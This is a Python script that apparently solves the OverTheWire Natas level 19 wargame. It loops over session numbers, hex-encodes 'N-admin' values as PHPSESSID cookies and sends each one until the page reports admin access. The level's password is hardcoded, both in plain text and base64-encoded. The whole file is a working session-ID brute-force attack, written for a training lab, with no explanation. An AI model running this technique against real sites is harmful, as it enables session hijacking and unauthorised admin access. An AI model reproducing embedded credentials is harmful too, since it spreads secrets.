#!/usr/bin/env python
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

for i in range(0, 641):
    print('trying', i)
    s = str(i) + '-admin'

    headers = {
        'Cookie':'PHPSESSID=' + s.encode('utf-8').hex(),
        'Authorization': 'bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=='

    }
    r = requests.get('http://natas19.natas.labs.overthewire.org/', auth=auth, headers=headers)
    if 'You are an admin' in r.text:
        print(r.text)
        break
